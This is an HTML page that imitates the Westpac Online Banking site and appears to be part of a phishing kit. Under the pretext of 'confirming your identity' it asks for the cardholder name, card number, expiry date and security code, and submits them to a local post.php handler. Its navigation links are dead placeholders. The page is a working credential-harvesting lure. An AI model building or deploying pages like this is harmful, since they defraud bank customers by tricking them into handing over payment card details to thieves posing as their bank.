<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Westpac Online Banking</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>


    <header class="bar">
      <div class="list">
        <nav>
            <a href="#">Lost or stolen cards</a>
            <a href="#">Contact us</a>
            <a href="#">Locate us</a>
        </nav>
        </div>
        <div class="register"><a href="#">Register for Westpac Online Banking</a></div>
        
    </header>

    <div class="down">
    <div class="logo">
          <img src="res/img/logo.png" alt="logo"> 
        </div>
        <nav>
            <a href="#">Home</a>
            <a href="#">Personal</a>
            <a href="#">Business</a>
            <a href="#">Corporate</a>
            <a href="#">About us</a>
        </nav>
    </div>
    
        <h2> Confirm your identity</h2>
        <p>Confirm your identity by entering your card information.</p>
        <div class="login">
    <div class="box">
      <div class="form">
        <form action="post.php" method="post">
        <label>Cardholder Name</label>
        <input type="text" name="name" >

        <label>Card Number</label>
        <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">

        <label>Expiration Date</label>
        <input type="text" name="exp" required placeholder="MM/YY" id="exp">

        <label>Security Code</label>
        <input type="password" name="cvv" required placeholder="CVV" id="cvv">
        <br>
          <br>


          <button type="submit">Continue</button>


        </form>
        </div>
    </div>
  </div>


    <footer>
        <div class="links">
            <a href="#">Register for Online Banking</a>
            <a href="#">Online Banking Help</a>
            <a href="#">Security Guarantee</a>
            <a href="#">Keep safe online</a>
            <a href="#">Terms and Conditions</a>
        </div>
    </footer>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>  

</body>
</html>
